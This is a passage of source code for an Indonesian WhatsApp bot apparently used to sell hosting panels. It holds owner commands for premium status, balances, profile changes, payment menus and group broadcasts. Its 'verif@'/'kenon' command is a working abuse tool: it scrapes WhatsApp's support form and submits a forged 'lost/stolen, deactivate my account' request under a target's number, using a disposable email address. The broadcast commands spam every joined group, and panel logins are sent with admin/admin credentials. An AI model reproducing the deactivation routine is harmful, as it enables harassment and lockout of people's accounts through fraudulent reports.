if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
m.reply('Pesanan Telah Sukses Dikirim') 
var mon = args.join(' ')
var m1 = mon.split(",")[0]
var m2 = mon.split(",")[1]
var m3 = mon.split(",")[2]
let mq1 = m1 + '@s.whatsapp.net'
let ownernya = owner + '@s.whatsapp.net'
let me = m.sender
let ments = [mq1, ownernya, me]
RezzHost.sendMessage(mq1, {text:`*───❖》RezzHost《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
}
break             

case "addpremium": case "addprem": {
if (!isCreator) return m.reply(mess.owner)
let b = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (args[0] == 'a') {
if (b in db.data.users) {
if (db.data.users[b].premium == true) return m.reply(`User ${args[0]} sudah menjadi *User Premium!*`)
db.data.users[b].limit += 10000
db.data.users[b].balance += 10000000000
db.data.users[b].premium = true
m.reply(`Berhasil update user ${args[1]} ke *User Premium*`) 
} else return m.reply(`User ${args[1]} tidak terdaftar di database bot`)
} else if (args[0] == 'b') {
if (b in db.data.users) {
if (db.data.users[b].premium == true) return m.reply(`User ${args[0]} sudah menjadi *User Premium!*`)
db.data.users[b].limit += 20000
db.data.users[b].balance += 30000000000
db.data.users[b].premium = true
m.reply(`Berhasil update user ${args[1]} ke *User Premium*`) 
} else return m.reply(`User ${args[1]} tidak terdaftar di database bot`)
} else if (args[0] == 'c') {
if (b in db.data.users) {
if (db.data.users[b].premium == true) return m.reply(`User ${args[0]} sudah menjadi *User Premium!*`)
db.data.users[b].limit += 30000
db.data.users[b].balance += 50000000000
db.data.users[b].premium = true
m.reply(`Berhasil update user ${args[1]} ke *User Premium*`) 
} else return m.reply(`User ${args[1]} tidak terdaftar di database bot`)
} else return m.reply(`*Penggunaan Salah !!!*\n*Contoh :* _${command} c 6282173242194`)
}
break

case "delpremium": case "delprem": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply("nomornya")
let user = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (db.data.users[user].premium == false) return m.reply(`User ${args[0]} bukan *User Premium!*`)
if (user in db.data.users) {
db.data.users[user].premium = false
m.reply("Berhasil menghapus *User Premium*")
} else return m.reply(`User ${args[0]} tidak terdaftar di database bot`)
}
break

case 'listregis':{
if (!isCreator) return m.reply(mess.owner)  
let anu =  require('./database/registered')
let teks = `乂 *L I S T - R E G I S T E R E D*\n`
teks += `*Total Register* : ${anu.lenght}\n\n`
anu.map((v, i) => {
teks += `• ${i+1} •\n`
teks += `*Id* : ${v.id}\n`
teks += `*Name* : ${v.name}\n`
teks += `*Age* : ${v.age}\n`
teks += `*Ns* : ${v.time}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${foter2}`
m.reply(teks) 
}
break

case "addbalance": {
if (!isCreator) return m.reply(mess.owner)
let user = args[0]+'@s.whatsapp.net'
if (args[0] && args[1]) {
if (isNaN(args[0])) return m.reply('nomornya 100')
if (!Object.keys(db.data.users).includes(user)) return m.reply("Nomor target tidak terdaftar di database bot!")
if (isNaN(args[1])) return m.reply('nomornya 100')
db.data.users[`${user}`].balance += Number(args[1])
RezzHost.sendMessage(m.chat, {text: `Berhasil menambah *${args[1]}* balance ke ${user.split("@")[0]}`})
} else return m.reply('nomornya 100')
}
break

case "payment": case 'nope': case 'nopay': {
RezzHost.sendMessage(from, {react: {text: "💸", key: m.key}})
let menunya = `Hai ${pushname} 👋
*Berikut Adalah Nope*
${ownername}

> *DANA :*
- ${dana}

> *OVO :*
- ${ovo}

> *GOPAY :*
- ${gopay}`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: menunya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: " "
}),
header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/70dcb743b90275871fa98.jpg" } }, { upload: RezzHost.waUploadToServer })),
title: `InzieOfc`,
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💶 COPY PAYMENT DANA",
"copy_code": `089667644225`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💷 COPY PAYMENT OVO",
"copy_code": `089667644225`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💵 COPY PAYMENT GOPAY",
"copy_code": `089667644225`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: 'https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k',
newsletterName: `NOPE REEEZ HOSTING`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break
case 'verif@': case 'kenon': {
if (!isCreator) return m.reply(mess.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break

case "listclaimprem": {
if (!isCreator) return m.reply(mess.owner)
if (db.data.settings.claimprem.length < 1) return m.reply("Tidak ada code claim prem")
var teks = `*乂 LIST CODE CLAIM PREM*\n\nTotal : *${db.data.settings.claimprem.length}*\n\n`
db.data.settings.claimprem.forEach((e) => {
teks += ` ◦ ${e}\n`
})
m.reply(teks)
}
break

case "addlimit": {
if (!isCreator) return m.reply(mess.owner)
let user = args[0]+'@s.whatsapp.net'
if (args[0] && args[1]) {
if (isNaN(args[0])) return m.reply(example('nomornya 100'))
if (!Object.keys(db.data.users).includes(user)) return m.reply("Nomor target tidak terdaftar di database bot!")
if (isNaN(args[1])) return m.reply(example('nomornya 100'))
db.data.users[`${user}`].limit += Number(args[1])
RezzHost.sendMessage(m.chat, {text: `Berhasil menambah *${args[1]}* limit ke ${user.split("@")[0]}`})
} else return m.reply(example('nomornya 100'))}
break

case "setnamagc": case "namegc": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botadmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (!text) return m.reply(example('teksnya'))
RezzHost.groupUpdateSubject(m.chat, text)
m.reply(mess.done)}
break

case 'del': {
if (!isCreator) return m.reply('Maaf, command ini hanya untuk pemilik.')
if (!m.quoted) return false
let { chat, fromMe, id, isBaileys } = m.quoted
RezzHost.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}
break

case "listhadiah": {
if (!isCreator) return m.reply(mess.owner)
if (db.data.settings.hadiah.length < 1) return m.reply("Tidak ada code hadiah")
var teks = `*乂 LIST CODE HADIAH*\n\nTotal : *${db.data.settings.hadiah.length}*\n\n`
db.data.settings.hadiah.forEach((e) => {
teks += ` ◦ ${e}\n`
})
m.reply(teks)
}
break

case "listprem": case "listpremium": {
if (!isCreator) return m.reply(mess.owner)
let user = Object.keys(db.data.users)
let ar = []
let urut = 1
var teks = '\n*乂 LIST USER PREMIUM*\n\n'
user.forEach((e) => {
if (db.data.users[e].premium == true) {
let no = urut++
teks += `${no}. @${e.split("@")[0]}\n`
ar.push(e)
}
})
if (ar.length < 1) {
m.reply("Tidak Ada User Premium")
} else {
RezzHost.sendMessage(m?.chat, {text: teks, contextInfo: {mentionedJid: [...ar]}}, {quoted: kalgans})
}}
break

case "public": {
if (!isCreator) return m.reply(mess.owner)
RezzHost.public = true
m.reply(mess.done)
}
break

case "self": {
if (!isCreator) return m.reply(mess.owner)
RezzHost.public = false
m.reply(mess.done)
}
break

case "buatclaimprem": {
if (!isCreator) return m.reply(mess.owner)
if (isNaN(args[0])) return m.reply('Jumlah Kode claim prem')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.claimprem.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.claimprem.forEach((e) => {
teks += `◦ ${e}\n`
})
m.reply(teks)
}
break

case "buathadiah": {
if (!isCreator) return m.reply(mess.owner)
if (isNaN(args[0])) return m.reply('Jumlah Kode Hadiah')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.hadiah.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.hadiah.forEach((e) => {
teks += `◦ ${e}\n`
})
m.reply(teks)
}
break

case 'getcase': {
const getCase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync("./Rezz Case.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
try{
if (!isCreator) return m.reply('ngapain')
if (!q) return m.reply(`contoh : ${prefix + command} antilink`)
let nana = await getCase(q)
m.reply(nana)
} catch(err){
console.log(err)
m.reply(`Case ${q} tidak di temukan`)
}
}
break 


case 'listjualan': {
await RezzHost.sendMessage(m.chat, { react: { text: "📦",key: m.key,}})  
let img = "https://telegra.ph/file/42c647df30fa35fe23acf.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url }}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`𝐈𝐧𝐳𝐢𝐞𝐎𝐟𝐜 𝐌𝐞𝐧𝐲𝐞𝐝𝐢𝐚𝐤𝐚𝐧`)  },
carouselMessage: {
cards: [{
header: {
imageMessage: await image(img),
hasMediaAttachment: true,
},
body: { text: `>  𝙋𝘼𝙉𝙀𝙇 PTERODACTYL\n\n*LIST PANEL BY INZIE STORE*

 • RAM 1GB | CPU 300% = [ 2.000 ]
 • RAM 2GB | CPU 300% = [ 2.500 ]
 • RAM 3GB | CPU 300% = [ 4.000 ]
 • RAM 4GB | CPU 400% = [ 5.000]
 • RAM 5GB | CPU 500% = [ 6.000 ]
 • RAM 6GB | CPU 600% = [ 7.000 ]
 • RAM 7GB | CPU 700% = [ 8.000 ]
 • RAM 8GB | CPU 800% = [ 9.000 ]
 • RAM 9GB | CPU 900% = [ 10.000 ]
 • RAM 10GB | CPU 900% =[ 12.000 ]
 • RAM UNLI | CPU UNLI =[ 14.000 ]

_KEUNTUNGAN MEMBELI PANEL_
- WEB CLOSE BOT TTP ON
- BOT ON 24 JAM
- HEMAT MEMO
- HEMAT DATA
- ANTI DELAY
- SRV AMAN
- DLL` },
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
'{"display_text":"𝘽𝙐𝙔 𝘿𝙄𝙎𝙄𝙉𝙄","url":"https:\\/\\/wa.me\\/6282173242194?text=Halo+Owner+Mau+pesan+panel","webview_presentation":null}',
},],},},{
header: {
imageMessage: await image(img),
hasMediaAttachment: true,
},
body: { text: `> 𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋\n\n *ADP 15K 1BULAN*\n\n*ADP PERMANEN 30K*\n\n*KEUNTUNGAN ADP*\n\n*_• 𝙱𝙸𝚂𝙰 𝙾𝙿𝙴𝙽 𝚁𝙴𝚂𝚂𝙴𝙻𝙴𝚁 𝙿𝙰𝙽𝙴𝙻 𝚂𝙴𝙿𝚄𝙰𝚂𝙽𝚈𝙰_*\n\n*_• 𝙱𝙸𝚂𝙰 𝙳𝙰𝙿𝙰𝚃 𝙰𝙺𝚂𝙴𝚂 𝙰𝙳𝙼𝙸𝙽 𝙳𝙸 𝚂𝙴𝚁𝚅𝙴𝚁 𝙿𝙰𝙽𝙴𝙻_*` },
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
'{"display_text":"𝘽𝙐𝙔 𝘿𝙄𝙎𝙄𝙉𝙄","url":"https:\\/\\/wa.me\\/6282173242194?text=Halo+Owner+Mau+pesan+adp","webview_presentation":null}',
},],},},{
header: {
imageMessage: await image(img),
hasMediaAttachment: true,
},
body: { text: `> 𝐏𝐀𝐑𝐓𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋\n\n\n> PT PANEL 20K 1BULAN\n\n> PT PANEL PRIVATE 40K\n\n*KEUNTUNGAN PT*\n\n*BISA OPEN RESELLER*\n\n*BISA OPEN ADP*\n\n*DAPET SC Cpanel Beton*` },
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
'{"display_text":"𝘽𝙐𝙔 𝘿𝙄𝙎𝙄𝙉𝙄","url":"https:\\/\\/wa.me\\/6282173242194?text=Halo+Owner+Mau+pesan+pt+panel","webview_presentation":null}',
},],},},{
header: {
imageMessage: await image(img),
hasMediaAttachment: true,
},
body: { text: `> 𝙂𝘼𝙍𝘼𝙉𝙎𝙄\n𝚞𝚗𝚝𝚞𝚔 𝚌𝚕𝚊𝚒𝚖 𝚐𝚊𝚛𝚊𝚗𝚜𝚒 𝚠𝚊𝚓𝚒𝚋 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚜𝚜 𝚝𝚏+𝚌𝚑𝚊𝚝\n\n𝚂𝙿𝙴𝙺 𝚅𝙿𝚂 16𝙶𝙱 𝙲4\n\n𝙰𝚗𝚝𝚒 𝚁𝚞𝚜𝚞𝚑/𝚌𝚘𝚕𝚘𝚗𝚐 𝚜𝚌 𝚘𝚛𝚊𝚗𝚐\n\n𝙺𝙴𝚃𝙰𝙷𝚄𝙰𝙽? 𝙳𝙴𝙻𝙴𝚃 𝙽𝙾 𝚁𝙴𝙵𝙵 𝙰𝙽𝚃𝙸 𝙱𝙰𝚂𝙰 𝙱𝙰𝚂𝙸\n\n> GARANSI 20HARI\n\nBUY? SUNG PENCET DIBAWAH INI` },
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
'{"display_text":"𝘽𝙐𝙔 𝘿𝙄𝙎𝙄𝙉𝙄","url":"https:\\/\\/wa.me\\/6282173242194?text=Halo+Owner+Mau+pesan","webview_presentation":null}',
},],},},],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'addcase': {
 if (!isCreator) return m.reply('lu sapa asu')
 if (!text) return m.reply('Mana case nya');
const fs = require('fs');
const namaFile = 'Rezz Case.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return;
}
const posisiAwalGimage = data.indexOf("case 'addcase':");

if (posisiAwalGimage !== -1) {
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
m.reply('Terjadi kesalahan saat menulis file:', err);
} else {
m.reply('Case baru berhasil ditambahkan.');
}
});
} else {
m.reply('Tidak dapat menambahkan case dalam file.');
}
});
}
break

case "setppbotpanjang": case "setpppanjang": {
if (!isCreator) return m.reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await RezzHost.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await RezzHost.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil Mengganti Foto Profil Bot ✅")
} else return m.reply('dengan mengirim foto')
}
break

case 'setbotname':{
if (!isCreator) return m.reply(`Khusus Owner`)
if (!text) return m.reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} RISKY HOST`)
await furina.updateProfileName(text)
m.reply(`Berhasil Mengubah Nama Bot Tuan✅`)
}
break

case "setppbot": {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await RezzHost.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await RezzHost.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(mess.done)
} else {
var memeg = await RezzHost.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(mess.done)
}
}
break

case 'getbio':{
if (!isCreator) return m.reply(mess.owner)
try {
let who
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
else who = m.quoted.sender ? m.quoted.sender : m.sender
let bio = await RezzHost.fetchStatus(who)
m.reply(bio.status)
} catch {
if (text) return m.reply(`bio is private or you haven't replied to the person's message!`)
else try {
let whoto = m.quoted ? m.quoted.sender : m.sender
let bio = await RezzHost.fetchStatus(who)
m.reply(bio.status)
} catch {
return m.reply(`bio is private or you haven't replied to the person's message!`)
}
}
}
break

case 'delppbot': {
if (!isCreator) return m.reply(mess.owner)
await RezzHost.removeProfilePicture(RezzHost.user.id)
m.reply(mess.done)
}
break

case 'getname': {
if (!isCreator) return m.reply(mess.owner)
if (qtod === "true") {
namenye = await RezzHost.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
RezzHost.sendMessage(from, {text:"Reply orangnya"}, {quoted:kalgans})
}
}
break

case 'restart':
if (!isCreator) return m.reply('wuuu')
m.reply(`_Restarting . . ._`)
await sleep(3000)
process.exit()
break

case "welcome": {
if (!isRegistered) return m.reply(`Kamu belum daftar!\nSilahkan daftar dengan cara *${prefix}daftar nama|umur!*`)
if (!isCreator) return m.reply('Ngapain ? Fitur Ini Khusus Tuan Saya😜')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await RezzHost.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
RezzHost.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break

case 'jpm': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} InzieOfcz Hosting`)
let getGroups = await author.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: `${idchannel}`,
 newsletterName: `${foter1}`, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: text
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: `${ownername}`,
 hasMediaAttachment: false,
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Telegram\",\"url\":\"https://t.me/InzieOfc_x_hosting\",\"merchant_url\":\"https://t.me/InzieOfc_x_hosting\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Market Place\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Information Bot\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(i, msg.message, {
 messageId: msg.key.id
})
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case "jpmtesti": case "bcgroup": case "bcgc": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await m.reply(mess.wait)
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await RezzHost.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await RezzHost.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await RezzHost.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await RezzHost.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
m.reply(mess.done)
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await RezzHost.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
RezzHost.sendMessage(i, {text: `${text}`}, {quoted:kalgans})
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//BATAS OWNER MENU

//MAIN MENU
case 'afk': {
let user = global.db.data.users[m.sender]
user.afkTime = +new Date
user.afkReason = text
m.reply(`💤 *${m.pushName}* Telah Afk${text ? ': ' + text : ''}`)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
 haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
